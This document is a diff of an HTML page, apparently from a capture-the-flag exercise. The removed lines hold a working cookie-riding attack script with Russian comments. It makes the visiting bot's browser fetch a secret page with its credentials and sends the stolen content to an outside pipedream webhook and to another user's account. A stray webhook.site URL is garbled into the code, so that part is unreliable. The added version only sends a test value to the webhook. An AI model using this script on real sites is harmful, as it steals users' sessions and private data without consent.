@@ -1,40 +1,10 @@
-<! DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <body>
     <script>
-        // Отправляем тестовый запрос на webhook (для проверки что скрипт работает)
-        fetch('https://eoeoea6xkzl1fz8.m.pipedream.net?step=1_script_loaded');
-        
-        // Делаем запрос на секретную страницу Кранга
-        // Браузер бота АВТОМАТИЧЕСКИ отправит его cookies с этим запросом! 
-        fetch('http://158.160.184.159:13002/kraang/brain', {
-            credentials: 'include'  // Браузер сам добавит cookies бота! 
-        })
-        .then(response => response.text())
-        .then(secretData => {
-            // Отправляем флаг на webhook
-            fetch('https://eoeoea6xkzl1fz8.m.pipedream.net?flag=' + encodeURIComponent(secretData));
-            
-            // И ещё отправляем через friendship request
-            return fetch('http://158.160.184.159:13002/api/friendship/request', {ttps://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334
-                method: 'POST',
-                credentials: 'include',  // Cookies бота снова автоматически!
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    to_user: "admin3",
-                    message: secretData
-                })
-            });
-        })
-        .then(() => {
-            fetch('https://eoeoea6xkzl1fz8.m.pipedream.net?step=2_attack_complete');
-        })
-        .catch(error => {
-            fetch('https://eoeoea6xkzl1fz8.m.pipedream.net?error=' + encodeURIComponent(error.toString()));
-        });
+        // Просто отправляем 123 на webhook
+        fetch('https://eoeoea6xkzl1fz8.m.pipedream.net? data=123');
     </script>
-    <p>Loading...  v10</p>
+    <p>v12 </p>
 </body>
 </html>
